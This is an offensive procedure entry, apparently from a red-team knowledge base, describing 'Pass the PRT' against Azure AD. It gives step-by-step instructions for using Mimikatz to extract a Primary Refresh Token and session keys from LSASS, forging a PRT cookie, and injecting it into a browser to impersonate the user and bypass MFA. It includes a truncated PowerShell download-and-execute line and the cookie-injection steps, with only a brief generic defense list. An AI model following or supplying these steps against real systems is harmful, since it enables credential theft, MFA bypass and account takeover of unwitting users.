---
id: 62e04165-3022-4f6d-af61-e18953cbd62d
name: Azure Pass The PRT with Mimikatz
type: procedure
verified: true
submitted: true
created_at: '2023-04-06T03:56:15.707900+00:00'
updated_at: '2023-05-25T19:01:32.208860+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Pass the Ticket|T1097 - Pass the Ticket]]'
platforms:
- Cloud
- Windows
tags:
- '[[Cloud - Azure]]'
- '[[Mimikatz]]'
- '[[Mimikatz - Credential Manager & DPAPI]]'
- '[[Pass The PRT]]'
- '[[Windows - DPAPI]]'
commands:
- '[[Display AzureAD status]]'
---

# Azure Pass The PRT with Mimikatz

**Status**: ✓ Verified

## Summary

Pass the PRT is a technique used to steal user credentials from Azure Active Directory (AAD) with a users machine. This procedure involves using Mimikatz to extract the PRT, KeyValue, Context, ClearKey, and DerivedKey from the targeted user's machine and generate a session cookie for the browser. T

## Description

# Description

Pass the PRT is a technique used to steal user credentials from Azure Active Directory (AAD) with a users machine. This procedure involves using Mimikatz to extract the PRT, KeyValue, Context, ClearKey, and DerivedKey from the targeted user's machine and generate a session cookie for the browser.



The business value of this procedure is that it allows an attacker to gain access to sensitive data stored in Azure resources, such as confidential documents or customer data.



PRT is stored in the LSASS and can be extracted usiung an LSASS dump tool (mimikatz) from an AD joined machine.

 

## Requirements

1. Access to the targeted user's machine

1. Mimikatz tool (version 2.2.0+)

1. AADInternals PowerShell module

## Defense

1. Implement multi-factor authentication for Azure Active Directory

1. Monitor for suspicious activity in Azure logs

1. Regularly review and rotate Azure access keys

 

## Objectives

1. Extract the PRT from LSASS

1. Extract the session key

1. Decrypt the session key using a DPAPI masterkey

1. Use decrypted session key to obtain the derived key and context (Used to create a PRT cookie, derived key signs the JWT for the cookie)

1. Using the PRT, derived key and context to create a new PRT cookie (valid for 14 days)

1. Import the cookie into a chrome browser session to authenticate as that user. (Bypass MFA)

 

# Instructions

1. Check if the machine has a Primary Refresh Token (PRT). AzureAdPrt must equal YES to continue / AzureAdJoined equal to YES.





**Command** ([[Display AzureAD status]]):

```bash
dsregcmd.exe /status
```







2. On the user machine run the following to obtain a Primary Refresh Token (PRT):



**Code**: [[# Run mimikatz to obtain the PRT
PS> iex (New-Obje]]





3. Inject the PRT session cookie into a browser to use the logged on users authentication:



*3a. Open a Private browser window (firefox)navigate to https://login.microsoftonline.com. Press Ctrl-Shift-I to open the inspect window.*

*3b. Click the Storage Tab, double click Cookies and click on "https://login.microsoftonline.com"*

*3c. Click on the + on the top right corner of the inspect window.*

*3d. In the name field enter: x-ms-RefreshTokenCredential*

*3e. In the Value enter the PRT  Session Cookie*

*3f. Set HttpOnly to True*







**Code**: [[Name: x-ms-RefreshTokenCredential
Value: [Paste yo]]





<u>Browser Window</u>



![75c89d28-c4af-4937-a596-f6f4a3fefb95.png](_assets/images/Ermis/75c89d28-c4af-4937-a596-f6f4a3fefb95.png)

<u>Inspect Window</u>





![df2c64a9-54f0-49e2-902a-8a3fa007db94.png](_assets/images/Ermis/df2c64a9-54f0-49e2-902a-8a3fa007db94.png)



## Platforms

- Cloud
- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Pass the Ticket|T1097 - Pass the Ticket]]

## Commands Used

- [[Display AzureAD status]]

## Tags

- [[Cloud - Azure]]
- [[Mimikatz]]
- [[Mimikatz - Credential Manager & DPAPI]]
- [[Pass The PRT]]
- [[Windows - DPAPI]]


